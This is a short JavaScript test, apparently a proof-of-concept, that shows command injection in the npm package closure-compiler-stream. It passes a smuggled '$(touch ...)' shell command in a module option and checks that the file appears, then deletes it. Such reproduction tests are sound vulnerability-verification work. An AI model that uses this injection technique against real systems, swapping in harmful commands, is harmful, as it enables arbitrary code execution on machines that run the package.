test("Command Injection in closure-compiler-stream", () => {
  const root = require("closure-compiler-stream");
  const gulp = require("gulp");
  const fs = require("fs");
  const path = "./closure-compiler-stream";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var options = {
    module: [[123], ["$(touch closure-compiler-stream)"]],
  };
  gulp.src("./closure-compiler-stream.js").pipe(root(options));

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
